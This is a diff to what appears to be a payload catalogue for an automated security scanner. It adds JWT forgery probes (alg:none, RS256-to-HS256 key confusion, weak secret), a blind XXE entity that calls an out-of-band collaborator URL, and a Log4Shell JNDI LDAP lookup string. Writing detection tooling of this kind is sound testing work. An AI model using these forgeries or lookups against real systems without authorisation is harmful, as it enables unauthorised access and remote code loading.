@@ -94,3 +94,59 @@ payloads:
     oracle_type: execution_confirmation
     payload_ref: xss/reflected/script-tag-canary
     graph_edge_on_success: derived_credential
+
+  # -- JWT forgery: structural authz, no injection sink (phase2a) --------------
+  - vuln_class: jwt_forgery
+    context: >-
+      Forged JWT accepted when it should be refused — alg:none (signature
+      stripped, empty sig). Confirmed by STRUCTURAL JWT_FORGERY: valid-token
+      2xx baseline, forged-token 2xx → violation; 4xx → denied.
+    inferred_sink_type: null
+    oracle_type: structural
+    payload_ref: jwt_forgery/none-alg
+    graph_edge_on_success: can_call
+
+  - vuln_class: jwt_forgery
+    context: >-
+      RS256→HS256 key-confusion — alg switched to HS256, signed with a
+      placeholder public-key-as-secret. Acceptance proves the verifier is not
+      validating against the real RS256 public key. Same STRUCTURAL JWT_FORGERY
+      confirmation.
+    inferred_sink_type: null
+    oracle_type: structural
+    payload_ref: jwt_forgery/hs256-key-confusion
+    graph_edge_on_success: can_call
+
+  - vuln_class: jwt_forgery
+    context: >-
+      Weak-HMAC-secret — HS256 signed with the canonical weak secret `secret`.
+      A verifier accepting it uses a guessable/default signing secret. Same
+      STRUCTURAL JWT_FORGERY confirmation.
+    inferred_sink_type: null
+    oracle_type: structural
+    payload_ref: jwt_forgery/weak-secret
+    graph_edge_on_success: can_call
+
+  # -- OOB blind shapes: XXE exfil + Log4Shell (phase2a) ------------------------
+  - vuln_class: sqli_blind
+    context: >-
+      Blind XXE external-entity exfiltration to an OOB collaborator — the
+      parser resolves SYSTEM "http://<nonce>.<collab>/xxe", correlating the
+      callback back to this probe's nonce. Confirmed by OOB_CALLBACK
+      (probe_nonce in observed_nonces). No injection sink — the payload sits in
+      an XML body, not a SQL parameter.
+    inferred_sink_type: null
+    oracle_type: oob_callback
+    payload_ref: sqli_blind/oob-xxe-exfil
+    graph_edge_on_success: enables
+
+  - vuln_class: command_injection
+    context: >-
+      Log4Shell — a ${jndi:ldap://<nonce>.<collab>/a} lookup in a log
+      field/header; an LDAP callback correlated back to this probe's nonce.
+      Confirmed by OOB_CALLBACK. No injection sink — the payload is a log/header
+      value, not a shell command string.
+    inferred_sink_type: null
+    oracle_type: oob_callback
+    payload_ref: command_injection/log4shell-oob
+    graph_edge_on_success: enables
